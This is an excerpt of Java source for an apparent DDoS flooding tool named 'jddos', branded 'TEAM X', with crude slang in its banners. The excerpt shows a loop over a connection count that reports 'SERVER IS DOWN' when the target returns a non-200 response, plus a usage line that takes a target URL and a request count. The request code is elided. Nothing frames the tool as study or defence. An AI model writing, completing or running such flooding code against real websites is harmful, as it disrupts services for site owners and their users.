        ...
        for(int x=0; x < con; x++){
            try {
                ...
                if (connection.getResponseCode() != 200){
                    System.out.println("\u001B[34m ERRER : SERVER IS DOWN  \u001B[0m");
                }
...
public class jddos{
    ...
    public static void main(String[] args) {
        clear_system();
        System.out.println("\u001B[32m     🤡    TEAM X IN ATTACK   🤡  \u001B[0m");
        System.out.println("\u001B[32m╔═══════════════════════════════════════╗\u001B[0m");
        System.out.println("\u001B[32m║ 🤡 dev : ♦ 𝐓𝐄𝐀𝐌 𝐗 ♦ 𝖡𝖺𝗅7𝖺 𝖷          ║\u001B[0m");
        System.out.println("\u001B[32m╚═══════════════════════════════════════╝\u001B[0m");  
        try {
            ...
            System.out.println("Usage: java teamx https://www.3asba.com 100");
            System.out.println("\u001B[32m╔═══════════════════════════════════════╗\u001B[0m");
            System.out.println("\u001B[32m║   🤡 TEAM X SLA3 KI ZEBI 🤡          ║\u001B[0m");
            System.out.println("\u001B[32m╚═══════════════════════════════════════╝\u001B[0m");  
        }
